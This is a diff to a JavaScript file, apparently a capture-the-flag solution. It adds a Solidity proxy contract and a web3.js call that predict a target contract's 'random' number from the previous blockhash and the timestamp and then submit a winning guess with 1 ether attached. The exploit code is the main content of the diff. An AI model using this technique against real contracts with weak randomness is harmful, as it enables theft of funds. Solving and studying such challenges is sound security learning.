@@ -127,3 +127,65 @@ guessCt.methods.guess(answer).send({
   from: "0x244CD9c888C03C26c41f58C851d53cEff47d224E",
   value: payValue,
 });
+
+//---------------------------------
+// Solution - using proxy
+/*
+contract Proxy {
+    address payable public owner;
+    constructor(address payable _owner) {
+        owner = _owner;
+    }
+   
+
+    receive() external payable {
+        // send all Ether to owner
+        // Owner can receive Ether since the address of owner is payable
+        // (bool success, ) = owner.call{value: msg.value}("");
+        // require(success, "Failed to send Ether");
+    }
+    
+     function proxyGuess(address payable _addr) public payable {
+         uint8 answer = uint8( 
+             uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
+             );
+         (bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000*5}(
+            abi.encodeWithSignature("guess(uint8)", answer)
+        );
+        require(success, "Failed to call");
+     }
+}
+
+*/
+
+async function proxyCall() {
+  const abi = [
+    {
+      inputs: [
+        {
+          internalType: "address payable",
+          name: "_addr",
+          type: "address",
+        },
+      ],
+      name: "proxyGuess",
+      outputs: [],
+      stateMutability: "payable",
+      type: "function",
+    },
+  ];
+
+  // Proxy ctx
+  const ctx = new web3.eth.Contract(
+    abi,
+    "0x27ecF58B12e45dDa805711E8C207a954Eb5a557D"
+  );
+  const target = "0x1a17C986B6FCE090c4F11fB8E7DcC904dBc133b2";
+
+  const res = await ctx.methods.proxyGuess(target).send({
+    from: account.address,
+    value: web3.utils.toWei("1", "ether"),
+    gasLimit: 21204 * 6,
+  });
+  console.log(res);
+}
